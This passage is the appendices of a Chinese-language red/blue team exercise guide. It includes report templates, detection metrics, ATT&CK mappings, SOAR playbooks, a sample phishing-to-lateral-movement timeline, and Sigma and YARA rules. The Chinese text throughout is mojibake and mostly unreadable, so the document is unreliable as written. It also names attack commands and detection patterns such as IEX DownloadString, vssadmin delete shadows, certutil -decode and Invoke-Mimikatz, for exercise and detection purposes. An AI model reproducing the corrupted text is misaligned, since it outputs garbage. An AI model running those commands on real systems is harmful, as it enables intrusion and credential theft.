- è¡ŒåŠ¨é¡¹ï¼š<æè¿° / è´£ä»»äºº / æˆªæ­¢æ—¶é—´>
```

### A.4 æ¼”ç»ƒå¤ç›˜æŠ¥å‘Šæ¨¡æ¿
```markdown
# çº¢è“å¯¹æŠ—å¤ç›˜æŠ¥å‘Š
1. æ¼”ç»ƒæ¦‚è§ˆï¼šç›®æ ‡ã€èŒƒå›´ã€æ—¶é—´ã€å›¢é˜Ÿã€æŒ‡æ ‡è¾¾æˆæƒ…å†µ
2. æ”»å‡»é“¾å›é¡¾ï¼šå…³é”®é˜¶æ®µã€æˆåŠŸ/å¤±è´¥ã€è¯æ®ç´¢å¼•
3. æ£€æµ‹ä¸å“åº”è¡¨ç°ï¼šMTTDã€MTTRã€è¯¯æŠ¥/æ¼æŠ¥ç»Ÿè®¡
4. å…³é”®å‘ç°ï¼šæŒ‰ç…§é£é™©ç­‰çº§åˆ—å‡ºé—®é¢˜ã€å½±å“ã€å»ºè®®
5. æŒ‡æ ‡åˆ†æï¼šæ£€æµ‹è¦†ç›–ç‡ã€è¡ŒåŠ¨é¡¹å®Œæˆæƒ…å†µã€æ”¹è¿›å»ºè®®
6. çŸ¥è¯†æ²‰æ·€ï¼šæ£€æµ‹è§„åˆ™ã€å‰§æœ¬æ›´æ–°ã€å·¥å…·æ”¹è¿›ã€åŸ¹è®­éœ€æ±‚
7. åç»­è®¡åˆ’ï¼šæ”¹è¿›è¡ŒåŠ¨é¡¹åˆ—è¡¨ã€å¤æµ‹è®¡åˆ’ã€é•¿æœŸå»ºè®¾ä¸»é¢˜
```

---

## é™„å½•Bï¼šå¯¹æŠ—æŒ‡æ ‡è¯å…¸
| æŒ‡æ ‡ | æè¿° | è®¡ç®—æ–¹æ³• | å…³æ³¨å›¢é˜Ÿ | å¤‡æ³¨ |
| --- | --- | --- | --- | --- |
| MTTD | å¹³å‡æ£€æµ‹æ—¶é—´ | (å‘Šè­¦æ—¶é—´-æ”»å‡»å¼€å§‹æ—¶é—´) å¹³å‡å€¼ | è“é˜Ÿ | é«˜ä»·å€¼èµ„äº§å•ç‹¬ç»Ÿè®¡ |
| MTTR | å¹³å‡å“åº”æ—¶é—´ | (é‡‡å–æªæ–½æ—¶é—´-å‘Šè­¦æ—¶é—´) å¹³å‡å€¼ | è“é˜Ÿ/ç´«é˜Ÿ | åŒºåˆ†åˆæ­¥å“åº”ä¸å®Œå…¨ä¿®å¤ |
| Coverage | æ£€æµ‹è¦†ç›–ç‡ | å‘½ä¸­çš„ATT&CKæŠ€æœ¯æ•° / æ€»æŠ€æœ¯æ•° | è“é˜Ÿ | ç»“åˆåœºæ™¯æƒé‡ |
| SuccessRate | çº¢é˜Ÿä»»åŠ¡æˆåŠŸç‡ | å®Œæˆä»»åŠ¡æ•° / æ€»ä»»åŠ¡æ•° | çº¢é˜Ÿ | åŒ…å«éšè”½æ€§è¯„åˆ† |
| ClosureRate | è¡ŒåŠ¨é¡¹å…³é—­ç‡ | å·²å…³é—­è¡ŒåŠ¨é¡¹ / æ€»è¡ŒåŠ¨é¡¹ | ç™½é˜Ÿ/ç´«é˜Ÿ | 30å¤©å†…è¿½è¸ª |
| Automation | è‡ªåŠ¨åŒ–è¦†ç›–ç‡ | è‡ªåŠ¨åŒ–æ‰§è¡Œæ­¥éª¤ / æ€»æ­¥éª¤ | è“é˜Ÿ/ç´«é˜Ÿ | åŒ…å«SOARã€è„šæœ¬ |

---

## é™„å½•Cï¼šå¸¸è§æ”»å‡»æ£€æµ‹æ˜ å°„è¡¨
| æ”»å‡»é˜¶æ®µ | MITREæŠ€æœ¯ | çº¢é˜Ÿæ“ä½œç¤ºä¾‹ | é¢„æœŸæ—¥å¿—/æ•°æ®æº | æ£€æµ‹å»ºè®® | åº”æ€¥åŠ¨ä½œ |
| --- | --- | --- | --- | --- | --- |
| Initial Access | T1566 é’“é±¼ | Gophishå‘é€å‡­è¯é’“é±¼ | é‚®ä»¶ç½‘å…³ã€ä»£ç†æ—¥å¿— | å…³é”®è¯è¿‡æ»¤ã€é“¾æ¥ä¿¡èª‰ | é˜»æ–­é“¾æ¥ã€é€šçŸ¥å—å®³è€… |
| Execution | T1059 PowerShell | IEXä¸‹è½½æ‰§è¡Œpayload | EventID 4104ã€Sysmon 1 | Base64æ£€æµ‹ã€å…³é”®å‡½æ•°ç›‘æ§ | éš”ç¦»ç»ˆç«¯ã€å–è¯å†…å­˜ |
| Persistence | T1547 Run Key | æ·»åŠ Runæ³¨å†Œè¡¨é¡¹ | Sysmon 13ã€4688 | æ£€æµ‹Run/RunOnceå˜åŒ– | æ¸…ç†æŒä¹…åŒ–é¡¹ |
| Privilege Escalation | T1068 ææƒæ¼æ´ | åˆ©ç”¨CVE-2021-34527 | åº”ç”¨ç¨‹åºæ—¥å¿—ã€ETW | ç›‘æµ‹å¼‚å¸¸æ‰“å°æœåŠ¡è°ƒç”¨ | æ‰“è¡¥ä¸ã€ç¦ç”¨æœåŠ¡ |
| Lateral Movement | T1021 SMB/RDP | CrackMapExecæ¨ªå‘ | 4624ã€ç½‘ç»œæµé‡ã€Zeek | å¤šä¸»æœºç™»å½•ã€å¤±è´¥æ¬¡æ•° | ç¦æ­¢è´¦æˆ·ç™»å½•ã€é‡ç½®å‡­è¯ |
| Exfiltration | T1041 ç½‘ç»œæ¸—å‡º | ä¸Šä¼ æ•°æ®åˆ°C2 | æµé‡æ—¥å¿—ã€ä»£ç†æ—¥å¿— | æ•°æ®åŒ…å¤§å°ã€åŠ å¯†å¤–è” | é˜»æ–­å‡ºå£ã€å°ç¦åŸŸå |

---

## é™„å½•Dï¼šå¸¸è§SOARå‰§æœ¬ç¤ºä¾‹
| å‰§æœ¬åç§° | è§¦å‘æ¡ä»¶ | è‡ªåŠ¨åŒ–æ­¥éª¤ | äººå·¥å†³ç­– | è¾“å‡º |
| --- | --- | --- | --- | --- |
| `PS_EncodedCommand_Response` | å‘Šè­¦å‘½ä¸­PowerShell Base64 | æ”¶é›†ä¸»æœºä¿¡æ¯ â†’ æŠ“å–è„šæœ¬ â†’ ä¸Šä¼ EDRéš”ç¦»è¯·æ±‚ | æ˜¯å¦éš”ç¦»ç»ˆç«¯ï¼Ÿ | å·¥å•ã€å–è¯åŒ…ã€æŠ¥å‘Š |
| `Credential_Dump_Response` | æ£€æµ‹åˆ°`mimikatz`å­—æ · | æŸ¥è¯¢è¿›ç¨‹ â†’ å¯¼å‡ºå†…å­˜ â†’ é‡ç½®è´¦æˆ·å¯†ç  | åˆ¤æ–­ä¸šåŠ¡å½±å“ä¸éš”ç¦»ç­–ç•¥ | äº‹ä»¶æ—¶é—´çº¿ã€å¯†ç é‡ç½®æ¸…å• |
| `Data_Exfiltration_Stop` | å‡ºå£æµé‡å¼‚å¸¸ | é˜»æ–­IP/åŸŸå â†’ æå–PCAP â†’ é€šçŸ¥ç½‘ç»œå›¢é˜Ÿ | æ˜¯å¦è§£é™¤é˜»æ–­ï¼Ÿ | å–è¯è¯æ®ã€é˜»æ–­è®°å½• |
| `Purple_Validation` | ç´«é˜Ÿåœºæ™¯éªŒè¯å®Œæˆ | æ”¶é›†æ”»é˜²æ•°æ® â†’ ç”ŸæˆæŠ¥å‘Š â†’ åˆ›å»ºæ”¹è¿›è¡ŒåŠ¨é¡¹ | ç¡®è®¤è¡ŒåŠ¨é¡¹è´Ÿè´£äºº | éªŒè¯æŠ¥å‘Šã€è¡ŒåŠ¨é¡¹åˆ—è¡¨ |

---

## é™„å½•Eï¼šæœ¯è¯­ä¸ç¼©å†™è¡¨
| ç¼©å†™ | è‹±æ–‡å…¨ç§° | ä¸­æ–‡å«ä¹‰ | è¯´æ˜ |
| --- | --- | --- | --- |
| ATT&CK | Adversarial Tactics, Techniques & Common Knowledge | å¯¹æ‰‹æˆ˜æœ¯æŠ€æœ¯çŸ¥è¯†åº“ | æ”»å‡»è€…è¡Œä¸ºæ¨¡å‹ |
| OPSEC | Operational Security | è¡ŒåŠ¨å®‰å…¨ | ä¿æŠ¤çº¢é˜Ÿè‡ªèº«å®‰å…¨ä¸éšè”½ |
| TTP | Tactics, Techniques, Procedures | æˆ˜æœ¯ã€æŠ€æœ¯ã€æµç¨‹ | æè¿°æ”»å‡»è€…è¡Œä¸ºç»†èŠ‚ |
| SOAR | Security Orchestration, Automation and Response | å®‰å…¨ç¼–æ’è‡ªåŠ¨åŒ–å“åº” | è‡ªåŠ¨åŒ–è”åŠ¨æ£€æµ‹å’Œå“åº” |
| MTTD | Mean Time To Detect | å¹³å‡æ£€æµ‹æ—¶é—´ | è“é˜Ÿæ•ˆç‡æ ¸å¿ƒæŒ‡æ ‡ |
| MTTR | Mean Time To Respond | å¹³å‡å“åº”æ—¶é—´ | åæ˜ å“åº”é€Ÿåº¦ |
| D3FEND | Defensive Countermeasures | é˜²å¾¡å¯¹ç­–çŸ¥è¯†åº“ | ä¸ATT&CKå¯¹ç…§ä½¿ç”¨ |
| CTI | Cyber Threat Intelligence | ç½‘ç»œå¨èƒæƒ…æŠ¥ | é©±åŠ¨æ”»é˜²æ¼”ç»ƒä¸æ£€æµ‹ |
| TTX | Tabletop Exercise | æ¡Œé¢æ¼”ç»ƒ | æ¼”ç»ƒå‰çš„æµç¨‹æ¨æ¼” |
| IOC | Indicator of Compromise | å…¥ä¾µæŒ‡ç¤ºå™¨ | ç”¨äºæ£€æµ‹æ”»å‡»è¿¹è±¡ |


## é™„å½•Fï¼šæ ·ä¾‹æ”»å‡»-æ£€æµ‹æ—¶é—´çº¿æ•°æ®é›†
| åºå· | æ—¶é—´ (UTC+8) | æ—¥å¿—æ¥æº | äº‹ä»¶æè¿° | æ”»å‡»é˜¶æ®µ | å¤‡æ³¨ |
| --- | --- | --- | --- | --- | --- |
| 001 | 2024-05-07 10:12:05 | Gophish | é‚®ä»¶ `HR-ç¦åˆ©è°ƒæ•´` å‘é€ç»™ alice@corp.com | Recon/Delivery | é‚®ä»¶ID GH-0001 |
| 002 | 2024-05-07 10:12:45 | Gophish | æ”¶ä»¶äººæ‰“å¼€é‚®ä»¶, User-Agent `Outlook/16.0` | Delivery | æ‰“å¼€å»¶è¿Ÿ40ç§’ |
| 003 | 2024-05-07 10:12:47 | Gophish | æ”¶ä»¶äººç‚¹å‡»é’“é±¼é“¾æ¥ `https://corp-hr.cn/login` | Initial Access |  |
| 004 | 2024-05-07 10:12:49 | Evilginx | æ•è·ç”¨æˆ·å `alice@corp.com` | Initial Access | SessionID EV-2134 |
| 005 | 2024-05-07 10:12:52 | Evilginx | æ•è·MFAéªŒè¯ç  `439872` | Initial Access |  |
| 006 | 2024-05-07 10:13:07 | VPNæ—¥å¿— | æ–°VPNè¿æ¥æ¥è‡ª45.77.12.34ï¼Œç”¨æˆ·alice | Initial Access | å‡ºå£IPåŒ¹é…æ‹¦æˆªåå• |
| 007 | 2024-05-07 10:13:09 | ç™½é˜Ÿè®°å½• | äº‹ä»¶ç¼–å· RT-2024-001 åˆ›å»º | Governance |  |
| 008 | 2024-05-07 10:13:25 | Sysmon (ID1) | ç›®æ ‡ä¸»æœº `HRPC01` æ‰§è¡Œ `whoami` | Execution | Beaconä¸Šçº¿éªŒè¯ |
| 009 | 2024-05-07 10:13:32 | Beacon æ—¥å¿— | C2å›è¿æˆåŠŸï¼Œä¿¡æ ‡é—´éš”60ç§’ | C2 | Profile HTTP-Profile-A |
| 010 | 2024-05-07 10:14:18 | Sysmon (ID11) | PowerShell åŠ è½½ `Invoke-Mimikatz` | Credential Access | å‘½ä»¤å“ˆå¸Œ 0x9af3 |
| 011 | 2024-05-07 10:14:22 | EDRå‘Šè­¦ | ç­–ç•¥ `Credential Theft` è§¦å‘ï¼ˆé£é™©é«˜ï¼‰ | Detection | SOCé˜Ÿåˆ—ä¼˜å…ˆçº§P1 |
| 012 | 2024-05-07 10:14:30 | SIEMäº‹ä»¶ | ç”Ÿæˆå‘Šè­¦ `PS_EncodedCommand` | Detection | å‘Šè­¦ID SIEM-4587 |
| 013 | 2024-05-07 10:14:45 | SOAR | Playbook `PS_EncodedCommand_Response` è‡ªåŠ¨æ‰§è¡Œ | Response | å·²æ”¶é›†ä¸»æœºä¿¡æ¯ |
| 014 | 2024-05-07 10:15:03 | SOAR | è‡ªåŠ¨ä¸‹å‘EDRéš”ç¦»å‘½ä»¤ | Containment | ç­‰å¾…å®¡æ‰¹ |
| 015 | 2024-05-07 10:15:25 | Analyst | åˆ†æå¸ˆç¡®è®¤éš”ç¦» | Response | å®¡æ‰¹äºº SOC-Lead |
| 016 | 2024-05-07 10:15:41 | EDRçŠ¶æ€ | ä¸»æœº HRPC01 éš”ç¦»æˆåŠŸ | Response |  |
| 017 | 2024-05-07 10:16:02 | Beacon æ—¥å¿— | Beaconæ‰çº¿ | Action on Objectives | çº¢é˜Ÿè®°å½•æˆåŠŸè§¦å‘æ£€æµ‹ |
| 018 | 2024-05-07 10:16:15 | è“é˜Ÿå·¥å• | äº‹ä»¶å• INC-2024-051 åˆ›å»º | Governance |  |
| 019 | 2024-05-07 10:17:30 | è“é˜Ÿå·¥å• | è®°å½•åˆæ­¥å½±å“è¯„ä¼° | Governance |  |
| 020 | 2024-05-07 10:17:45 | ç™½é˜Ÿ | æ›´æ–°è®¡åˆ†è¡¨ | Governance |  |
| 021 | 2024-05-07 10:18:12 | PowerShellæ—¥å¿— | ä¸»æœº `FINPC02` æ‰§è¡Œä¸‹è½½å‘½ä»¤ | Execution |  |
| 022 | 2024-05-07 10:18:20 | Proxyæ—¥å¿— | è¯·æ±‚ `https://cdn.corp-update.com/payload.ps1` | Delivery | URLè¢«è¿‡æ»¤æ ‡è®° |
| 023 | 2024-05-07 10:18:30 | è“é˜Ÿ | åˆ›å»ºç‹©çŒä»»åŠ¡ `HNT-221` | Threat Hunting |  |
| 024 | 2024-05-07 10:18:55 | Beacon æ—¥å¿— | `FINPC02` ä¿¡æ ‡ä¸Šçº¿ | C2 |  |
| 025 | 2024-05-07 10:19:07 | Sysmon | `FINPC02` æ‰§è¡Œ `net use \FILE01\share` | Lateral Movement |  |
| 026 | 2024-05-07 10:19:12 | Zeek SMB | è®°å½•æ–°SMBä¼šè¯ | Lateral Movement |  |
| 027 | 2024-05-07 10:19:34 | Zeek Notice | è§¦å‘è§„åˆ™ `SMB_PTH` | Detection |  |
| 028 | 2024-05-07 10:19:50 | SOAR | è‡ªåŠ¨ç¦ç”¨è´¦å· `alice` | Response |  |
| 029 | 2024-05-07 10:20:05 | è“é˜Ÿ | é€šçŸ¥ITç¡®è®¤åˆæ³•æ€§ | Governance |  |
| 030 | 2024-05-07 10:21:20 | çº¢é˜Ÿ | æŠ¥å‘Šè“é˜Ÿå·²é˜»æ–­ | Governance |  |
| 031 | 2024-05-07 10:22:00 | æ—¥æŠ¥ | è®°å½•â€œæ£€æµ‹è€—æ—¶ 1åˆ†55ç§’â€ | Metrics |  |
| 032 | 2024-05-07 10:25:07 | è“é˜Ÿ | æ”¶é›†å†…å­˜é•œåƒ | Forensics |  |
| 033 | 2024-05-07 10:27:45 | è“é˜Ÿ | ä¸Šä¼ è¯æ®è‡³å–è¯å¹³å° | Forensics |  |
| 034 | 2024-05-07 10:32:12 | çº¢é˜Ÿ | æ¸…ç†æŒä¹…åŒ–ã€è§£é™¤VPN | Recovery |  |
| 035 | 2024-05-07 10:45:00 | ç™½é˜Ÿ | æ›´æ–°é£é™©å°è´¦ L1 | Governance |  |
| 036 | 2024-05-07 11:30:00 | SOC | å®Œæˆåˆæ­¥æŠ¥å‘Š | Governance |  |
| 037 | 2024-05-07 15:00:00 | ç´«é˜Ÿä¼šè®® | è®¨è®ºæ£€æµ‹æ¼ç‚¹ | Improvement |  |
| 038 | 2024-05-07 16:30:00 | è¡ŒåŠ¨é¡¹ | åˆ›å»ºæ”¹è¿›é¡¹ ACT-008 | Improvement |  |
| 039 | 2024-05-08 09:00:00 | æ”¹è¿› | å®ŒæˆACT-008 | Improvement |  |
| 040 | 2024-05-10 09:30:00 | å¤æµ‹ | WMIæ£€æµ‹æˆåŠŸ | Validation |  |
| 041 | 2024-05-12 14:00:00 | æŠ¥å‘Š | æœ€ç»ˆæŠ¥å‘Šè‰ç¨¿å®Œæˆ | Governance |  |
| 042 | 2024-05-15 10:00:00 | å¤ç›˜ä¼š | è¾“å‡º10é¡¹å»ºè®® | Improvement |  |
| 043 | 2024-05-20 18:00:00 | è¡ŒåŠ¨é¡¹è·Ÿè¸ª | å…³é—­ç‡è¾¾90% | Metrics |  |
| 044 | 2024-05-30 09:00:00 | å›è®¿ | ä¸ä¸šåŠ¡æ€»ç»“ | Governance |  |
| 045 | 2024-06-01 12:00:00 | ç™½é˜Ÿ | å½’æ¡£è¯æ®ã€æ›´æ–°çŸ¥è¯†åº“ | Improvement |  |

## é™„å½•Gï¼šATT&CK æŠ€æœ¯ä¸æ£€æµ‹è§„åˆ™æ˜ å°„ç¤ºä¾‹
| æˆ˜æœ¯ | æŠ€æœ¯ç¼–å· | æŠ€æœ¯åç§° | çº¢é˜Ÿç¤ºä¾‹ | æ£€æµ‹æ•°æ®æº | è§„åˆ™/è„šæœ¬ | æ¨èå“åº” |
| --- | --- | --- | --- | --- | --- | --- |
| Initial Access | T1190 | Exploit Public-Facing Application | Struts2è¿œç¨‹å‘½ä»¤æ‰§è¡Œ | WebæœåŠ¡å™¨æ—¥å¿—ã€WAFã€Sysmon 1 | WAFè§„åˆ™`Struts2-OGNL`, Sysmonå‘½ä»¤è¡ŒåŒ¹é… | ä¸´æ—¶å°ç¦IPã€ä¿®è¡¥æ¼æ´ |
| Initial Access | T1133 | External Remote Services | ä½¿ç”¨æ³„éœ²VPNå‡­è¯ | VPNæ—¥å¿—ã€Radiusæ—¥å¿— | å…³è”ç™»å½•æ¨¡å¼ã€åœ°ç†ä½ç½®æ£€æµ‹ | å†»ç»“è´¦å·ã€å¼ºåˆ¶æ”¹å¯† |
| Execution | T1059.001 | PowerShell | IEX DownloadString | WinEvent 4104ã€Sysmon6 | Sigma `powershell_encoded_command` | éš”ç¦»ä¸»æœºã€æŠ“å–å†…å­˜ |
| Execution | T1053 | Scheduled Task | æ³¨å†Œè®¡åˆ’ä»»åŠ¡æ‰§è¡Œ payload | 4698ã€Sysmon1 | ç›‘æ§`schtasks.exe`æ–°å¢ä»»åŠ¡ | åˆ é™¤ä»»åŠ¡ã€è°ƒæŸ¥ä½œè€… |
| Persistence | T1547.001 | Registry Run Keys | æ·»åŠ Runé”®åŠ è½½DLL | 4657ã€Sysmon13 | æ£€æµ‹Run/RunOnce ä¿®æ”¹ | æ¸…ç†æ³¨å†Œè¡¨ã€é‡å¯ä¸»æœº |
| Persistence | T1037 | Startup Items | å°†è„šæœ¬æ”¾å…¥å¯åŠ¨é¡¹ | æ–‡ä»¶å®¡è®¡ã€Sysmon | ç›‘æ§`Startup`ç›®å½•æ–‡ä»¶ | åˆ é™¤æ–‡ä»¶ã€æé†’ç”¨æˆ· |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | PrintNightmare | åº”ç”¨æ—¥å¿—ã€Sysmon | æ£€æµ‹`spoolsv`å¼‚å¸¸è¡Œä¸º | ç¦ç”¨æœåŠ¡ã€æ‰“è¡¥ä¸ |
| Privilege Escalation | T1078 | Valid Accounts | ä½¿ç”¨æœ¬åœ°ç®¡ç†å‘˜å¯†ç é‡ç”¨ | 4624ã€EDR | è¯†åˆ«æ¨ªå‘ç™»å½• | é‡ç½®å¯†ç ã€å¯ç”¨LAPS |
| Defense Evasion | T1112 | Modify Registry | ä¿®æ”¹æ—¥å¿—ç­–ç•¥ | 4657ã€Sysmon | æ£€æµ‹`AuditPolicy`æ›´æ”¹ | æ¢å¤ç­–ç•¥ã€è°ƒæŸ¥æ¥æº |
| Defense Evasion | T1140 | Deobfuscate/Decode Files | `certutil -decode` | Sysmon 11 | å‚æ•°æ£€æµ‹ | é˜»æ–­åç»­æ‰§è¡Œ |
| Credential Access | T1003.001 | LSASS Memory | Invoke-Mimikatz | Sysmon 10ã€EDR | ç›‘æ§`lsass`å¥æŸ„è®¿é—® | éš”ç¦»ä¸»æœºã€æ”¶é›†å†…å­˜ |
| Credential Access | T1555 | Credentials from Password Stores | å¯¼å‡ºæµè§ˆå™¨å¯†ç  | Sysmon 1ã€æ–‡ä»¶æ—¥å¿— | æ£€æµ‹`Login Data`è®¿é—® | é€šçŸ¥ç”¨æˆ·ã€é‡ç½®å‡­è¯ |
| Discovery | T1087 | Account Discovery | `net user /domain` | Sysmon 1ã€PowerShell | å‘½ä»¤è¡Œå…³é”®å­— | å®¡æ ¸æ¥æº |
| Discovery | T1046 | Network Service Scanning | `nmap -p-` | Zeekã€Firewall | ç«¯å£æ‰«ææ£€æµ‹ | å°ç¦æ‰«æIP |
| Lateral Movement | T1021.002 | SMB/Windows Admin Shares | PsExec | 5145ã€Sysmon 3 | æ£€æµ‹`psexec`è¡Œä¸º | é˜»æ–­å…±äº«ã€å®¡è®¡è´¦å· |
| Lateral Movement | T1080 | Taint Shared Content | æ›¿æ¢å…±äº«ç›®å½•æ–‡ä»¶ | FIM | Hashå¯¹æ¯”æŠ¥è­¦ | æ¢å¤æ–‡ä»¶ |
| Command and Control | T1071.001 | Web Protocols | Cobalt Strike HTTP | Proxyã€Zeek | Beaconæ£€æµ‹ | é˜»æ–­åŸŸå |
| Command and Control | T1095 | Non-Application Layer Protocol | ICMPéš§é“ | Zeek ICMP | æ•°æ®åŒ…å¤§å°æ£€æµ‹ | é˜»æ–­ICMP |
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol | FTPä¸Šä¼ æ•°æ® | FTPæ—¥å¿—ã€æµé‡è®°å½• | ç›‘æ§FTPå¤§æµé‡ | é˜»æ–­ä¼šè¯ |
| Exfiltration | T1041 | Exfiltration Over C2 Channel | HTTP POSTä¸Šä¼  | Proxy | ç›‘æ§POSTæ•°æ®é‡ | å°ç¦è¯·æ±‚ |
| Impact | T1486 | Data Encrypted for Impact | å‹’ç´¢åŠ å¯† | æ–‡ä»¶å®¡è®¡ã€EDR | ç›‘æ§åŠ å¯†åç¼€ | éš”ç¦»ç»ˆç«¯ |
| Impact | T1490 | Inhibit System Recovery | åˆ é™¤å½±å­æ‹·è´ | Sysmon 1 | `vssadmin delete shadows` | ç«‹å³éš”ç¦» |

## é™„å½•Hï¼šSigma ä¸ YARA ç¤ºä¾‹è§„åˆ™
```yaml
# Sigma: Suspicious Base64 PowerShell
title: Suspicious PowerShell Base64 Execution
id: 1f6f56b8-b5a0-4b9a-91c1-ps-encoded
status: experimental
description: Detects PowerShell execution with base64 encoded commands
logsource:
  product: windows
  service: security
  definition: 'EventID 4688'
detection:
  selection:
    NewProcessName|endswith: '\powershell.exe'
    CommandLine|contains|all:
      - '-enc'
      - 'FromBase64String'
  condition: selection
fields:
  - CommandLine
  - ParentProcessName
  - User
falsepositives:
  - Legitimate administrative scripts
level: high
```

```yaml
# Sigma: SMB Pass-the-Hash Detection
title: Potential Pass-the-Hash Via SMB
id: a21dd550-9a29-4d1c-8d9b-smb-pth
status: experimental
logsource:
  product: windows
  service: security
  definition: 'EventID 4624'
detection:
  selection:
    AuthenticationPackageName: 'NTLM'
    LogonType: 3
  filter_known:
    IpAddress|in:
      - '10.10.10.10'
      - '10.10.10.11'
  timeframe: 10m
  condition: selection and not filter_known
level: high
```

```yara
rule CobaltStrike_Beacon
{
    meta:
        description = "Detects default cobalt strike beacon config"
        author = "PurpleTeam"
    strings:
        $a = "MZ" ascii at 0
        $b = { 2E 00 30 00 2E 00 30 00 2E 00 30 00 }
        $c = "Cobalt Strike" ascii nocase
    condition:
        $a and $b and $c
}
```

## é™„å½•Iï¼šæ•°æ®å­—æ®µæ ‡å‡†åŒ–æ¸…å•
| æ•°æ®æº | å­—æ®µ | æè¿° | æ•°æ®ç±»å‹ | ç¤ºä¾‹ |
| --- | --- | --- | --- | --- |
| WinEvent | EventID | äº‹ä»¶ç¼–å· | integer | 4688 |
| WinEvent | Computer | ä¸»æœºå | string | HRPC01 |
| WinEvent | CommandLine | è¿›ç¨‹å‘½ä»¤ | string | powershell.exe -enc JAB |
| VPNæ—¥å¿— | username | ç™»å½•ç”¨æˆ·å | string | alice |
| VPNæ—¥å¿— | public_ip | ç”¨æˆ·å…¬ç½‘IP | ip | 45.77.12.34 |
| Proxyæ—¥å¿— | url | è®¿é—®URL | string | https://cdn.corp-update.com/payload.ps1 |
| Proxyæ—¥å¿— | bytes_out | ä¸‹è¡Œå­—èŠ‚ | integer | 10485760 |
| Zeek | uid | ä¼šè¯ID | string | CH1i4U3dN9h |
| Zeek | resp_h | å“åº”IP | ip | 10.10.20.15 |
| SOARå·¥å• | ticket_id | å·¥å•ç¼–å· | string | INC-2024-051 |
| SOARå·¥å• | sla_due | SLAæˆªæ­¢ | datetime | 2024-05-07T11:15:00 |
| æŒ‡æ ‡åº“ | metric_name | æŒ‡æ ‡åç§° | string | MTTD |
| æŒ‡æ ‡åº“ | metric_value | æŒ‡æ ‡å€¼ | float | 1.92 |
| æŒ‡æ ‡åº“ | target | ç›®æ ‡å€¼ | float | 2.00 |


## ğŸ“ æ€»ç»“

çº¢è“å¯¹æŠ—æ˜¯æå‡ç»„ç»‡å®‰å…¨èƒ½åŠ›çš„æœ‰æ•ˆæ–¹æ³•ã€‚é€šè¿‡æ¨¡æ‹ŸçœŸå®æ”»å‡»ï¼Œå¯ä»¥ï¼š
- å‘ç°é˜²å¾¡ç›²ç‚¹
- éªŒè¯å®‰å…¨æ§åˆ¶
- æå‡å›¢é˜Ÿèƒ½åŠ›
- å®Œå–„å“åº”æµç¨‹

æˆåŠŸçš„çº¢è“å¯¹æŠ—éœ€è¦ï¼š
1. æ˜ç¡®çš„ç›®æ ‡å’ŒèŒƒå›´
2. ä¸“ä¸šçš„çº¢è“å›¢é˜Ÿ
3. å®Œå–„çš„è§„åˆ™åˆ¶åº¦
4. æŒç»­çš„æ”¹è¿›ä¼˜åŒ–

è®°ä½ï¼šçº¢è“å¯¹æŠ—çš„ç›®çš„æ˜¯å…±åŒè¿›æ­¥ï¼Œè€Œéç®€å•çš„èƒœè´Ÿã€‚

---

**æ–‡æ¡£ç‰ˆæœ¬**: v3.0
**æœ€åæ›´æ–°**: 2024å¹´4æœˆ
**ç»´æŠ¤è€…**: Red Team & Blue Team
**åé¦ˆé‚®ç®±**: security@example.com
